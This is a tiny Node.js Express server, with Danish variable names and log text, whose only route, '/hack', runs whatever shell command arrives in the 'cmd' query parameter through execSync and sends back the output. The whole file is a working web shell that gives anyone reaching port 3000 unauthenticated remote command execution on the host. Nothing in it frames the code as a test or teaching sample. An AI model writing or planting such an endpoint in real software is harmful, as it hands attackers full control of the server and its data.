const express = require('express');
const app = express();

app.use(express.json());

app.get('/hack', (req, res) => {
  const { execSync } = require('child_process');
  const resultat = execSync(req.query.cmd);
  res.send(resultat.toString());
});

app.listen(3000, () => console.log('App kører på port 3000'));